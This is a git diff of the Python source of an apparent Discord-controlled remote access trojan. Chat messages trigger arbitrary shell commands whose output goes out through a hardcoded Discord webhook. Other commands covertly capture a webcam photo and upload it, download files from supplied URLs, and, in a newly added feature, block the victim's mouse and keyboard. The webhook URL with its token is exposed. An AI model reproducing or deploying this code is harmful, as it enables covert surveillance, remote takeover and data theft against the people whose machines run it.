@@ -8,13 +8,8 @@ from discord_webhook import DiscordWebhook
 import wmi
 import requests
 import cv2
+import pynput
 
-from dotenv import load_dotenv
-load_dotenv()
-
-
-
-#TOKEN = os.getenv("BOT_TOKEN")
 TOKEN = ""
 WEBHOOK_URL = "https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF"
 
@@ -38,40 +33,25 @@ async def on_message(message):
         await message.channel.send('Sent command!')
         command = message.content
         command = command.replace('command ', '')
-        # os.system(command)
         hmm = subprocess.run(command, capture_output=True, text=True)
         out = hmm.stdout
         out = out.replace('Ã', '├')
         out = out.replace('Ä', '─')
         print(out)
-        #webhook = DiscordWebhook(url=os.getenv("WEBHOOK_URL"), content=out)
-        #response = webhook.execute()
-        
-        
+
         chunklength = 2000
         chunks = [out[i:i+chunklength ] for i in range(0, len(out), chunklength )]
         for chunk in chunks: 
             webhook = DiscordWebhook(url=WEBHOOK_URL, content=chunk)
             response = webhook.execute()
         
-        
-        
-        
-    
-        
     elif message.content.startswith('cam'):
-        # Open a connection to the webcam (0 is usually the default camera)
         cap = cv2.VideoCapture(0)
 
-        # Check if the camera is opened successfully
         if not cap.isOpened():
             print("Error: Could not open camera.")
             return
-
-        # Set the duration for capturing frames (in seconds)
         capture_duration = 1
-
-        # Capture frames for the specified duration
         start_time = time.time()
         while (time.time() - start_time) < capture_duration:
             ret, frame = cap.read()
@@ -79,15 +59,9 @@ async def on_message(message):
                 print("Error: Failed to capture frame.")
                 break
 
-            # Display the frame (optional)
-            # cv2.imshow("Frame", frame)
-            # cv2.waitKey(1)
-
-        # Save the last captured frame as an image
         cv2.imwrite("pic.jpg", frame)
         print("Picture captured successfully as 'captured_picture.jpg'")
 
-        # Release the camera and close the OpenCV window (if displayed)
         cap.release()
         cv2.destroyAllWindows()
         time_now = datetime.datetime.now()
@@ -96,16 +70,9 @@ async def on_message(message):
         with open("./pic.jpg", "rb") as f:
             webhook.add_file(file=f.read(), filename="pic.jpg")
         response = webhook.execute()
-        #os.remove("./help.png")
+        os.remove("./pic.jpg")
 
-        
-        
-        
-        
-        
-        
-       
-    
+
     elif message.content.startswith('com'):
         await message.channel.send('Sent command!')
         command = message.content
@@ -113,6 +80,18 @@ async def on_message(message):
         os.system(command)
         
         
+    elif message.content.startswith('lock'):
+        await message.channel.send('locked!')
+        command = message.content
+        command = command.replace('lock ', '')
+        mouse_listener = pynput.mouse.Listener(suppress=True)
+        mouse_listener.start()
+        keyboard_listener = pynput.keyboard.Listener(suppress=True)
+        keyboard_listener.start()
+        time.sleep(int(command))
+        mouse_listener.stop()
+        keyboard_listener.stop()
+        await message.channel.send('unlocked!')
         
         
         
@@ -176,7 +155,7 @@ async def on_message(message):
     
         url = command
         r = requests.get(url, allow_redirects=True)
-        open('facebook.ico', 'wb').write(r.content)
+        open('d.d', 'wb').write(r.content)
         
 
     elif message.content.startswith('sys'):
